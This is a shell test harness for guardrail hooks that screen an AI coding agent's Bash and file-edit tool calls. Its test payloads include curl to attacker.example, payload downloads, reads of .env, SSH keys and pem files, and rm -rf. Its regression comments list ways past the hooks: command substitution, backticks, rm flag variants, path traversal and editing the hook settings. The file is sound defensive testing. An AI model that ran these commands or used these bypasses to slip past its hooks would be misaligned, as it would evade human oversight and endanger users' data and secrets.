#!/usr/bin/env bash
# Harness: pipes synthetic Claude Code payloads into each hook, asserts exit codes.
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd )"
HOOKS="$ROOT/scripts/hooks"
export CLAUDE_PROJECT_DIR="$ROOT"
pass=0; fail=0

check() { # check <name> <script> <payload-json> <expected-exit>
  local name="$1" script="$2" payload="$3" want="$4" got
  printf '%s' "$payload" | "$HOOKS/$script" > /dev/null 2>&1
  got=$?
  if [ "$got" -eq "$want" ]; then
    echo "PASS $name";  pass=$((pass+1))
  else
    echo "FAIL $name  (want exit $want, got $got)";  fail=$((fail+1))
  fi
}
mk() { printf '{"tool_name":"%s","tool_input":%s}' "$1" "$2"; }

# ---- deny-danger.sh (PreToolUse: Bash) ----#
check "rm -rf blocked"          deny-danger.sh "$(mk Bash '{"command":"rm -rf /tmp/x"}')"   2
check "curl blocked"          deny-danger.sh "$(mk Bash '{"command":"curl http://attacker.example/x"}')"   2
check "wget blocked"          deny-danger.sh "$(mk Bash '{"command":"wget http://x.io/payload"}')"   2
check "cat .env blocked"      deny-danger.sh "$(mk Bash '{"command":"cat .env"}')"   2
check "read pem blocked"      deny-danger.sh "$(mk Bash '{"command":"head -5 bot.pem"}')"   2
check "~/.ssh blocked"        deny-danger.sh "$(mk Bash '{"command":"ls ~/.ssh"}')"   2
check "force push blocked"    deny-danger.sh "$(mk Bash '{"command":"git push --force origin main"}')"   2
check "chained rm blocked"    deny-danger.sh "$(mk Bash '{"command":"echo hi && rm -rf src"}')"   2
check "plain ls allowed"      deny-danger.sh "$(mk Bash '{"command":"ls -la src/"}')"   0
check "pytest allowed"        deny-danger.sh "$(mk Bash '{"command":"uv run pytest -q"}')"   0
check "git push allowed"      deny-danger.sh "$(mk Bash '{"command":"git push origin feat/x"}')"   0
check "grep env-var allowed"  deny-danger.sh "$(mk Bash '{"command":"grep -r ENVIRONMENT src/"}')"   0

# ---- protect-paths.sh (PreToolUse: Edit|Write) ----
check "hooks dir blocked"     protect-paths.sh "$(mk Write "{\"file_path\":\"$ROOT/scripts/hooks/evil.sh\"}")"   2
check "workflows blocked"     protect-paths.sh "$(mk Edit "{\"file_path\":\"$ROOT/.github/workflows/test.yml\"}")"   2
check "datasets blocked"      protect-paths.sh "$(mk Write "{\"file_path\":\"$ROOT/evals/datasets/gold.jsonl\"}")"   2
check "src write allowed"     protect-paths.sh "$(mk Write "{\"file_path\":\"$ROOT/src/pdlc/ears/patterns.py\"}")"   0
check "tests write allowed"   protect-paths.sh "$(mk Write "{\"file_path\":\"$ROOT/tests/ears/test_patterns.py\"}")"   0
#
# ---- gate-locked requirements (conditional) ----
FIX="$ROOT/specs/FEAT-000"; mkdir -p "$FIX"
echo "pm_gate: approved" > "$FIX/gate-log.md"
check "approved reqs blocked"   protect-paths.sh "$(mk Edit "{\"file_path\":\"$FIX/requirements.md\"}")"   2
rm -rf "$FIX/gate-log.md"
check "unapproved reqs allowed"   protect-paths.sh "$(mk Edit "{\"file_path\":\"$FIX/requirements.md\"}")"   0
rm -rf "$FIX"

# ---- lint-test-touched.sh (PostToolUse: Edit|Write) ----
check "non-python skipped"    lint-test-touched.sh "$(mk Write "{\"file_path\":\"$ROOT/README.md\"}")"   0
check "clean python allowed"  lint-test-touched.sh "$(mk Write "{\"file_path\":\"$ROOT/src/pdlc/common/__init__.py\"}")"   0
DIRTY="$ROOT/src/pdlc/common/_hooktest_fixture.py"
printf 'def f(a,b):\n  return  a+b\n' > "$DIRTY"
check "unformatted python blocked"  lint-test-touched.sh "$(mk Write "{\"file_path\":\"$DIRTY\"}")"   2
rm -f "$DIRTY"

# ---- REGRESSION: gaps found by probing, hooks not yet fixed ----
# deny-danger's rm regex requires TWO of [rf] adjacent, so these all slip through.
check "rm -r blocked"          deny-danger.sh "$(mk Bash '{"command":"rm -r src"}')"   2
check "rm -Rf blocked"         deny-danger.sh "$(mk Bash '{"command":"rm -Rf src"}')"   2
check "rm -r -f blocked"       deny-danger.sh "$(mk Bash '{"command":"rm -r -f src"}')"   2
check "rm --recursive blocked" deny-danger.sh "$(mk Bash '{"command":"rm --recursive --force src"}')"   2
# protect-paths' `.claude/settings.json/*` pattern only matches paths BELOW the
# file, treating it as a directory; the file itself is unprotected.
check "settings.json blocked"  protect-paths.sh "$(mk Edit "{\"file_path\":\"$ROOT/.claude/settings.json\"}")"   2

# ---- REGRESSION: secret patterns match prose, not just access ----
# deny-danger greps the whole command string, so a commit message or PR body
# that NAMES a protected path is denied the same as reading one. This blocked
# the Day 2 PR body, which documented the hook's own coverage.
check "commit msg naming ssh allowed"  deny-danger.sh "$(mk Bash '{"command":"git commit -m \"harden ~/.ssh handling\""}')"   0
check "pr body naming env allowed"     deny-danger.sh "$(mk Bash '{"command":"gh pr create --body \"documents the .env policy\""}')"   0
# WONTFIX (decided 2026-08-12): `grep -rn bot.pem docs/` searches docs FOR the
# string, while `grep secret bot.pem` reads the key. Separating those needs
# positional argument parsing, not a regex — more ways to be wrong than the
# annoyance it removes. Blocking both is the fail-safe side for key material.
# Revisit only if the checks are rewritten around a real command parser.
check "docs naming pem stays blocked"  deny-danger.sh "$(mk Bash '{"command":"grep -rn bot.pem docs/"}')"   2
# ...while actual access must stay blocked. Any fix has to keep these red-lined:
# they are what proves a prose exemption did not open a secret-access hole.
check "real ssh read still blocked"    deny-danger.sh "$(mk Bash '{"command":"cat ~/.ssh/id_rsa"}')"   2
check "real env read still blocked"    deny-danger.sh "$(mk Bash '{"command":"cat .env.production"}')"   2

# ---- REGRESSION: word-boundary evasion via command substitution ----
# The destructive and egress patterns require ^ or one of [;&| ] before the
# tool name, so the "(" of $(...) and a backtick both hide it. These are
# evasions, not annoyances: the command reads as innocuous and still runs.
check "egress after -m still blocked"  deny-danger.sh "$(mk Bash '{"command":"git commit -m \"msg\" && curl http://x.io/p"}')"   2
check "egress via cmd-subst blocked"   deny-danger.sh "$(mk Bash '{"command":"git commit -m \"$(curl http://x.io/p)\""}')"   2
check "delete in --body still blocked" deny-danger.sh "$(mk Bash '{"command":"gh pr create --body \"x\" && rm -rf src"}')"   2
check "delete via cmd-subst blocked"   deny-danger.sh "$(mk Bash '{"command":"echo \"$(rm -rf src)\""}')"   2
check "delete via backticks blocked"   deny-danger.sh "$(mk Bash '{"command":"echo `rm -rf src`"}')"   2

# ---- REGRESSION: protect-paths matches path STRINGS, not resolved paths ----
# rel is a prefix-strip of CLAUDE_PROJECT_DIR, then matched with shell globs.
# Anything that reaches a protected file by a different-looking string slips
# past: the case arms never see the path the filesystem would actually open.
# 1. Traversal landing back inside the repo. Same file as "hooks dir blocked",
#    written a different way. Unambiguously a bypass.
check "hooks via .. traversal blocked" protect-paths.sh "$(mk Write "{\"file_path\":\"$ROOT/tests/../scripts/hooks/evil.sh\"}")"   2
# 2. Absolute path outside the repo. rel keeps its leading /, so no arm matches.
#    Whether a repo hook should police the user's global config is a scope call
#    -- but disabling hooks there defeats this repo's policy just as thoroughly.
check "global settings blocked"        protect-paths.sh "$(mk Write "{\"file_path\":\"$HOME/.claude/settings.json\"}")"   2

echo
echo "hooks harness: $pass passed, $fail failed"
[ "$fail" -eq 0 ]
